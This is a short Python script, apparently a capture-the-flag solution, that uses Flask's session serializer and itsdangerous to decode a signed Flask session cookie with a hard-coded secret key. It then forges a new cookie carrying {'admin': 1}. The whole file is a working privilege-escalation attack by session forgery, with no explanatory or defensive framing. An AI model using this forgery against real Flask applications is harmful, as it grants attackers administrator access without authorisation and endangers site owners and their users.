import hashlib

from flask.sessions import TaggedJSONSerializer
from itsdangerous import URLSafeTimedSerializer


def decode_flask_cookie(secret_key, cookie_str):
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
    return s.loads(cookie_str)


def encode_flask_cookie(secret_key):
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
    return s.dumps({'admin': 1}, salt=salt)


print(decode_flask_cookie('itisveryverysecret', 'eyJhZG1pbiI6MH0.ZB-kZQ.6rZca-l5h-48H9nHCzPUmE0Txk8'))

print(encode_flask_cookie('itisveryverysecret'))
